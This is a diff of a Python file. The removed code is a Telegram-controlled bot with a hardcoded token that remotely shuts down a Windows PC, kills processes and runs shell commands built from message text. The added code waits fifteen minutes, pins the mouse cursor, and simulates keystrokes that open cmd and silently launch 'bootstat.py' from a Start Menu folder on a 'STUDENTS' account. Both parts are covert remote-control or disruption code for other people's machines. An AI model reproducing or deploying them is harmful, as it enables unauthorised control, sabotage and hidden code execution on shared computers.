@@ -1,36 +1,47 @@
-import telegram.ext as telegram
-import os
-import pathlib
-import keyboard
-from pynput.keyboard import Controller, Key
+ 
 
-key ="5758276265:AAGZaVLrrGnYkz3T_t7C8A9ra329O5xzep4"
-git = ["mkdir a", "mkdir b", "mkdir c"]
-def aux(update,context):
-      message =update.message.text.split(" ")
-      payload = message[0]
-      if payload == "sysoff":
-            os.system("shutdown /s /t 0")    
-      if payload == "appoff":
-            try:
-              os.system(f"taskkill /F /IM {message[1]}")
-            except Exception as e:
-              update.message.reply_text("Something's wrong with appOff")
-      if payload == "git":
-            home_ = f"{pathlib.Path.home()}\\3d Objects\Lorr\{message[1]}"
-            try:
-              reply = os.system(f"cd {home_} && {git[0]} && {git[1]} && {git[2]}")
-              match reply:
-                case 0:
-                  update.message.reply_text("✔✔")
-                case 1:
-                  update.message.reply_text("❌❌")
-              
-            except Exception as e:
-              update.message.reply_text("Something's wrong with git")         
-updater = telegram.Updater(key,use_context=True)
-disp = updater.dispatcher
-disp.add_handler(telegram.MessageHandler(telegram.Filters.text,aux))
-updater.start_polling()
-print("bot start")
-updater.idle()
+from pynput.keyboard import Controller, Key
+from concurrent.futures import thread
+import keyboard as keyboard_
+import time
+from ctypes import *
+import threading
+import mouse
+
+time.sleep(900)
+# time.sleep(10)cmd
+def blockmouse():    
+    blocker_flag = 0              
+    while True:
+        mouse.move(0,0)
+        blocker_flag=blocker_flag+1
+        if blocker_flag == 300:
+            break
+def payload():
+    keyboard = Controller()
+    with keyboard.pressed(Key.cmd_l):
+        keyboard.press("r")
+    time.sleep(0.5)
+    keyboard.type("cmd")
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+    time.sleep(0.5)
+    # keyboard.type(r"cd C:\\Users\STUDENTS\\3D Objects\src\\touch")
+    keyboard.type(r"cd C:\\Users\STUDENTS\AppData\\Roaming\\Microsoft\Windows\Start Menu\\Programs\\Python 3.10\\")
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+    time.sleep(0.5)
+    keyboard.type("pythonw bootstat.py")
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+    time.sleep(0.5)
+    keyboard.type("exit")
+    keyboard.press(Key.enter)
+    keyboard.release(Key.enter)
+    time.sleep(0.5)
+    
+t2=threading.Thread(target=blockmouse)
+t3=threading.Thread(target=payload)
+
+t2.start()
+t3.start()
